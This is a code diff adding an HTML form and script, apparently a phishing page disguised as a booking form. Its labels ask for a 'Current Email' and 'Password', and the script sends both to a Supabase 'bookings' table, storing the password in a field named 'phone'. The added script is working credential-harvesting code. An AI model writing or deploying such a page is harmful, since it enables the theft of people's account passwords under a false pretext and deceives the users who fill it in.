@@ -52,17 +52,71 @@
         <label>Current Email</label>
         <input type="email" id="email" placeholder="Enter your email address" required>
       </div>
-      <div class="input-group">
-        <label>Password</label>
-        <input type="password" id="password" placeholder="Enter your password" required>
-      </div>
-
-<button type="button" onclick="handleBooking(event)">احجز الان</button>
-       
-    </form>
 
    
 
+
+       <!-- لازم السطر ده يكون فوق الفورم مرة واحدة في الصفحة -->
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+<form id="loginForm">
+  <div class="input-group">
+    <label>Current Email</label>
+    <input type="email" id="email" placeholder="Enter your email address" required>
+  </div>
+  <div class="input-group">
+    <label>Password</label>
+    <input type="password" id="password" placeholder="Enter your password" required>
+  </div>
+  <button type="button" onclick="handleBooking(event)">احجز الان</button>
+  <p id="msg" style="text-align:center; margin-top:10px;"></p>
+</form>
+
+<script>
+// اتصال Supabase
+const supabaseClient = window.supabase.createClient(
+  'https://nwpyevsjnublptabupup.supabase.co',
+  'sb_publishable_v18mMHdeW7e-0pegmi9sTg_U3HkIlJK'
+);
+
+async function handleBooking(e){
+  e.preventDefault();
+  
+  const email = document.getElementById('email').value.trim();
+  const password = document.getElementById('password').value.trim();
+  const btn = e.target;
+  const msg = document.getElementById('msg');
+
+  if(!email || !password){
+    alert('من فضلك اكتب الايميل والباسورد');
+    return;
+  }
+
+  btn.disabled = true;
+  btn.innerText = 'جاري الارسال...';
+
+  const { error } = await supabaseClient.from('bookings').insert([{
+    name: 'حجز من الفورم',
+    email: email,
+    phone: password,
+    destination: 'Current Email Form'
+  }]);
+
+  if(error){
+    alert('خطأ: ' + error.message);
+    msg.innerText = '❌ ' + error.message;
+    msg.style.color = 'red';
+  } else {
+    alert('✅ تم الحجز بنجاح! البيانات وصلت السيرفر');
+    msg.innerText = '✅ تم بنجاح';
+    msg.style.color = 'green';
+    document.getElementById('loginForm').reset();
+  }
+
+  btn.disabled = false;
+  btn.innerText = 'احجز الان';
+}
+</script>
    
 </body>
 </html>
